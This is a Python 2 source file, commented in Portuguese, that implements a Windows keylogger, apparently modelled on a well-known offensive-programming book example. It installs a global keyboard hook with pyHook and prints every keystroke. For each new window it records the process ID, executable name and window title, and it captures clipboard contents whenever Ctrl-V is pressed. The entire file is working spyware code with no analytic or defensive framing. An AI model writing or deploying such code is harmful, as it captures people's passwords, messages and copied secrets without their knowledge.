from ctypes import *
import pythoncom
import pyHook 
import win32clipboard

user32   = windll.user32
kernel32 = windll.kernel32
psapi    = windll.psapi
current_window = None

def get_current_process():

    # obtem um handle para a janela em primeiro plano
    hwnd = user32.GetForegroundWindow()

    # descobe o ID do processo
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))

    # armazena o ID do processo do corrent
    process_id = "%d" % pid.value

    # obtem o executavel
    executable = create_string_buffer("\x00" * 512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)

    psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)

    # agora le o titulo
    window_title = create_string_buffer("\x00" * 512)
    length = user32.GetWindowTextA(hwnd, byref(window_title),512)

    # exibe o cabecalho se estivers no processo correto
    print
    print "[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value)
    print
  

    # fecha handles
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)
    
def KeyStroke(event):

    global current_window   

    # verifica se houve mudanca de janela no alvo
    if event.WindowName != current_window:
        current_window = event.WindowName        
        get_current_process()

    # se uma teclada padrao foi pressionada
    if event.Ascii > 32 and event.Ascii < 127:
        print chr(event.Ascii),
    else:
        # se foi [Ctrl-V] obtem o valor de area de transferencia
        if event.Key == "V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            print "[PASTE] - %s" % (pasted_value),
        else:
            print "[%s]" % event.Key,

    # passa execucao para o proximo hook registrado
    return True

# cria e registrada um geerenciador de hooks
kl         = pyHook.HookManager()
kl.KeyDown = KeyStroke

# registra o hook e executa indefinidamente
kl.HookKeyboard()
pythoncom.PumpMessages()
pythoncom.PumpMessages()